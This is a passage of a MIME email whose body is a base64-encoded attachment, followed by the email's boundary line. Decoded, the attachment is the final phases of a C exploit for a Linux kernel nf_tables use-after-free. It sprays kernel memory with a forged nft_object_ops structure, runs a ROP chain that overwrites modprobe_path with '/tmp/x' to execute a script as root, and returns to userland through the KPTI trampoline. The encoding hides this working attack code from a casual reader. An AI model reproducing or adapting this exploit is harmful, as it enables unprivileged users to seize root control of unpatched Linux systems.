dCBjYWxsb2MoKSIpOwoJc3AyX2RfbCA9ICh1aW50NjRfdCAqKXNwMl9kOwoJ
Cglmb3IoaW50IGkgPSAwIDsgaSA8ICgweGM4IC8gc2l6ZW9mKHVpbnQ2NF90
KSkgOyBpKyspCgkJc3BfZF9sW2ldID0gc3RhY2tfcGl2b3RfYWRkcjsgLy8g
cHVzaCByZGkgOyBwb3AgcnNwIDsgYWRkIGNsLCBjbCA7IHJldAoJCglwdXRz
KCJcdFsqXSBTcHJheWluZyB3aXRoIG5sYV9tZW1kdXAoKSBhbGxvY2F0aW9u
cyB0byBjcmFmdCBmYWtlIG5mdF9vYmplY3Rfb3BzIHN0cnVjdC4uLiIpOwoJ
c3ByYXlfbWVtZHVwKHNwX2QsIDB4YzgsIDQwOTYpOwoJCgkvKiBDbGVhbnVw
IChmcm9tIHBoYXNlIDIsIDMsIDQpICovCglwdXRzKCJcdFsqXSBDbGVhbmlu
ZyB1cC4uLiIpOwoJZGVsZXRlX3RhYmxlKFRBQkxFX1JEX1VBRl9CKTsKCWRl
bGV0ZV90YWJsZShUQUJMRV9ITEtfVUFGX0IpOwoJCglwdXRzKCJcdFsrXSBG
YWtlIG5mdF9vYmplY3Rfb3BzIHN0cnVjdCBzaG91bGQgYmUgaW4gdGFyZ2V0
IG1lbW9yeSEiKTsKCQoJLyogPT09PT09PT09PT09PT09PT09PT09IFsgUGhh
c2UgNSAtIENvZGUgZXhlY3V0aW9uIF0gPT09PT09PT09PT09PT09PT09PT09
ICovCgkKCXB1dHMoIltpXSBQaGFzZSA1IC0gQ29kZSBleGVjdXRpb24gKFJP
UCkiKTsKCQoJc2xlZXAoMik7CgkKUEhBU0VfNToKCS8qCgkgICBGaW5hbGx5
LCB0cmlnZ2VyIFVBRiBvbiB0aGUgb2JqZWN0cyBjcmVhdGVkIGF0IHRoZSB2
ZXJ5CgkgICBiZWdnaW5pbmcgb2YgdGhlIGV4cGxvaXQuCgkqLwoJCglkZWxl
dGVfdGFibGUoVEFCTEVfUlBfVUFGX0EpOwoJCglyb3BfZCA9IGNhbGxvYygw
eGM4LCBzaXplb2YoY2hhcikpOwoJaWYoIXJvcF9kKQoJCWJ5ZSgiWy1dIEVy
cm9yIGF0IGNhbGxvYygpIik7Cglyb3BfZF9sID0gKHVpbnQ2NF90ICopcm9w
X2Q7CgkKCS8qCgkgICBXZSBidWlsZCBhIFJPUCBjaGFpbiBpbiB0aGVzZSBz
cHJheWVkIG5sYV9tZW1kdXAoKQoJICAgYWxsb2NhdGlvbnMsIHdpdGggdGhl
IGhvcGUgdGhhdCBvbmUgb2YgdGhlbSBlbmQgdXAKCSAgIHRha2luZyB0aGUg
Y2h1bmsgcHJldmlvdXNseSB1c2VkIGJ5IHRoZSBuZnRfb2JqZWN0CgkgICBh
bmQgZm9yIHdoaWNoIHdlIHN0aWxsIGtlZXAgYSByZWZlcmVuY2UuCgkgICAK
CSAgIFRoZSBST1AgY2hhaW4gd2lsbCB1c2UgYSB3cml0ZS13aGF0LXdoZXJl
IGdhZGdldCB0bwoJICAgd3JpdGUgb3VyIGN1c3RvbSB1c2VybW9kZSBoZWxw
ZXIgZm9yIG1vZHByb2JlX3BhdGgsCgkgICB0aGlzIHdpbGwgYWxsb3cgdXMg
dG8gZ2V0IGEgY3VzdG9tIHNjcmlwdCBvZiBvdXJzCgkgICBiZSBleGVjdXRl
ZCBhcyByb290LgoJICAgCgkgICBGaW5hbGx5LCB3ZSByZWFjaCB0aGUgS1BU
SSB0cmFtcG9saW5lIGZvciByZXR1cm5pbmcKCSAgIHRvIHRoZSB1c2VybGFu
ZC4KCSAgIAoJKi8KCglyb3BfZF9sWzBdID0gcG9wX3JkeF9yZXQ7IAkJCS8v
IHBvcCByZHggOyByZXQKCXJvcF9kX2xbMV0gPSBtb2Rwcm9iZV9wYXRoOwkJ
CS8vIG1vZHByb2JlX3BhdGgKCXJvcF9kX2xbMl0gPSBwb3BfcmF4X3JldDsJ
CQkvLyBwb3AgcmF4IDsgcmV0Cglyb3BfZF9sWzNdID0gMHg3ODJmNzA2ZDc0
MmY7CQkJLy8gIi90bXAveFx4MDBceDAwIgoJcm9wX2RfbFs0XSA9IG1vdl9x
cHRyX3JkeF9yYXhfcmV0OwkJLy8gbW92IHF3b3JkIHB0ciBbcmR4XSwgcmF4
IDsgcmV0Cglyb3BfZF9sWzVdID0ga3B0aV90cmFtcG9saW5lOwkJCS8vIHN3
YXBnc19yZXN0b3JlX3JlZ3NfYW5kX3JldHVybl90b191c2VybW9kZSArIDIy
Cglyb3BfZF9sWzZdID0gMHgwMDAwMDAwMDAwMDAwMDAwOwkJLy8gUkFYCgly
b3BfZF9sWzddID0gMHgwMDAwMDAwMDAwMDAwMDAwOwkJLy8gUkRJCglyb3Bf
ZF9sWzhdID0gdXNlcl9yaXA7CQkJCS8vIHVzZXJfcmlwCglyb3BfZF9sWzld
ID0gdXNlcl9jczsJCQkJLy8gdXNlcl9jcwoJcm9wX2RfbFsxMF0gPSB1c2Vy
X3JmbGFnczsJCQkvLyB1c2VyX3JmbGFncwoJcm9wX2RfbFsxMV0gPSB1c2Vy
X3NwOwkJCQkvLyB1c2VyX3NwCglyb3BfZF9sWzEyXSA9IHVzZXJfc3M7CQkJ
CS8vIHVzZXJfc3MKCXJvcF9kX2xbMTNdID0gMHg0MzQzNDM0MzQzNDM0MzQz
OwkJLy8gZHVtbXkKCXJvcF9kX2xbMTRdID0gMHg0MzQzNDM0MzQzNDM0MzQz
OwkJLy8gZHVtbXkKCXJvcF9kX2xbMTVdID0gMHg0MzQzNDM0MzQzNDM0MzQz
OwkJLy8gZHVtbXkKCXJvcF9kX2xbMTZdID0gb2JqX2xlYWtlZF9hZGRyOwkJ
CS8vIG9iai0+b3BzIChwb2ludHMgdG8gc3RhY2sgcGl2b3Q6IG9iai0+b3Bz
LT5ldmFsKCkpcwoJCglwdXRzKCJcdFsqXSBTcHJheWluZyB3aXRoIG5sYV9t
ZW1kdXAoKSBhbGxvY2F0aW9ucyBjb250YWluaW5nIFJPUCBjaGFpbi4uLiIp
OwoJc3ByYXlfbWVtZHVwKHJvcF9kLCAweGM4LCA0MDk2KTsKCQoJcHV0cygi
XHRbKl0gVHJpZ2dlcmluZyBuZXR3b3JrIGhvb2suLi4iKTsKCQoJLyogUHJl
dmVudCBwcm9ibGVtcyB3aXRoIHRoZSBjcmVhdGlvbiBvZiBzb2NrZXRzIHRv
IHRyaWdnZXIgdGhlIGhvb2tzICovCglzeXN0ZW0oImlwIGxpbmsgc2V0IGRl
diBsbyB1cCIpOwoJCgkvKiBTZXQgdXAgc2VydmVyIGF0IFRSSUdfUE9SVCBp
biBhIG5ldyBwcm9jZXNzICovCglzZmQgPSBmb3JrKCk7CglpZihzZmQgPT0g
MCkgewoJCXNldHVwX3RyaWdfc2VydmVyKCk7CgkJZXhpdCgwKTsKCX0KCQoJ
LyogVHJpZ2dlciB0aGUgbmV0d29yayBob29rIHdlIGNyZWF0ZWQgZm9yIHRh
YmxlIFRBQkxFX1JQX1VBRl9CIG9uIHRoZSBVQUYtcmVmZXJlbmNlZCBvYmpl
Y3QgKi8KCWNmZCA9IGZvcmsoKTsKCWlmKGNmZCA9PSAwKSB7CgkJdHJpZ19u
ZXRfc29jaygpOwoJCWV4aXQoMCk7Cgl9CgkKCWlzX3N1Y2Nlc3MgPSAxOwoJ
ciA9IHdyaXRlKHBpcGVmZFsxXSwgJmlzX3N1Y2Nlc3MsIHNpemVvZihpbnQp
KTsKCWlmKHIgPCAwKQoJCXJldHVybiAxOwoJCglzbGVlcCgxMCk7CgkKCS8q
ID09PT09PT09PT09PT09PT09PT09PSBbIENsZWFudXAgXSA9PT09PT09PT09
PT09PT09PT09PT0gKi8KCkZJTkFMX0NMRUFOVVA6CglraWxsKGNmZCwgU0lH
S0lMTCk7CglraWxsKHNmZCwgU0lHS0lMTCk7CgljbG9zZShmZCk7CglkZWxl
dGVfdGFibGUoVEFCTEVfUlBfVUFGX0IpOwoJY2xlYW51cF9zcHJheV90YWJs
ZXMoKTsKCXJldHVybiAwOwoKfQoKCgoKCg==

--_004_SA1PR06MB8071EFD7F55B335FB7D01E87D8769SA1PR06MB8071namp_--
